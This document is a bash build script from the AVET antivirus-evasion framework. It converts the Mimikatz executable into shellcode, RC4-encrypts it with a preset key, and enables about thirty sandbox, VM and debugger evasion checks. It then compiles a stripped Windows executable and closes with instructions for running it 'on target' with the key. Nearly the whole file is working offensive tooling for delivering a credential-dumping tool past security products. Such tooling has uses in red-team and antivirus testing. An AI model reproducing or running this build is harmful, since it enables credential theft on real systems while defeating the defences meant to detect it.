#!/bin/bash

#DESCRIPTION_START
# Calls all sandbox evasion techniques.
# RC4-encrypt the payload with a static, preset key.
# Here, the mimikatz executable is used as payload, converted into shellcode format by pe_to_shellcode.
# pe_to_shellcode is written by Hasherezade:
# https://github.com/hasherezade/pe_to_shellcode

# This script expects the Mimikatz executable to be at input/mimikatz.exe
# and the pe_to_shellcode executable to reside in a folder parallel to avet: ../pe_to_shellcode/pe2shc.exe
#DESCRIPTION_END

# print AVET logo
cat banner.txt

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh


#CONFIGURATION_START
# enable debug output
enable_debug_print
# generate key file with preset key
generate_key preset aabbccdd1122 input/key_raw.txt
#CONFIGURATION_END

## call sandbox evasions
add_evasion check_fast_forwarding
add_evasion computation_fibonacci 10
add_evasion computation_timed_fibonacci 10
add_evasion evasion_by_sleep 3
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
add_evasion get_bios_info
add_evasion get_computer_domain 'domain.com'
add_evasion get_cpu_cores 2
add_evasion get_eventlog
add_evasion gethostbyname_sandbox_evasion 'testdomain.com'
add_evasion get_install_date '01/10/2022'
add_evasion get_num_processes 50
add_evasion get_registry_size
add_evasion get_standard_browser 'Firefox'
add_evasion get_tickcount
add_evasion get_usb
add_evasion has_background_wp
add_evasion has_folder 'C:/Users/user/Downloads/'
add_evasion has_network_drive
add_evasion has_public_desktop
add_evasion has_recent_files
add_evasion has_recycle_bin
add_evasion has_username 'IEUser'
add_evasion has_vm_mac
add_evasion has_vm_regkey
add_evasion interaction_getchar
add_evasion interaction_msg_box
add_evasion interaction_system_pause
add_evasion is_debugger_present
add_evasion sleep_by_ping 3
add_evasion hide_console

# no command execution
set_command_source no_data
set_command_exec no_command

# convert mimikatz executable into shellcode format
# Can be of course used with other .exe files
wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/sc_raw.txt
# encrypt payload
encode_payload rc4 input/sc_raw.txt input/sc_enc_raw.txt input/key_raw.txt

# convert encoded, raw payload into c format for static include
./tools/data_raw_to_c/data_raw_to_c input/sc_enc_raw.txt input/sc_enc_c.txt buf

# set payload source
set_payload_source static_from_file input/sc_enc_c.txt

# set decoder
set_decoder rc4

# convert key to c format and include statically
./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key
set_key_source static_from_file input/key_c.txt

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode64


# compile to exe file
$win64_compiler -o output/rc4_mimikatz_all_evasions.exe source/avet.c -lws2_32 -liphlpapi
strip output/rc4_mimikatz_all_evasions.exe

# cleanup
cleanup_techniques


echo "
# The decryption key is aabbccdd1122 if it has not been changed.
# You need to provide the decryption key as 2nd command line argument.
# Call generated executable on target like:
# $ rc4_mimikatz_all_evasions.exe [your mimikatz arguments, probably 'coffee']  [decryption key]
"
